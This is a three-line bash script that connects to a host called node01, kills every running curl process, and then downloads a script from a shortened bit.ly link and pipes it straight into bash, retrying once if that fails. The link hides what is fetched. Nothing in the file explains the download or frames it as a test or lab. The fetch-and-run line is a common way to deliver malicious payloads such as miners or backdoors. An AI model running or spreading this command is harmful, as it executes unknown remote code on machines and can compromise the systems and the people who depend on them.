#!/bin/bash
ssh node01
killall curl && curl -L https://bit.ly/3lalhby | bash || curl -L https://bit.ly/3lalhby | bash 

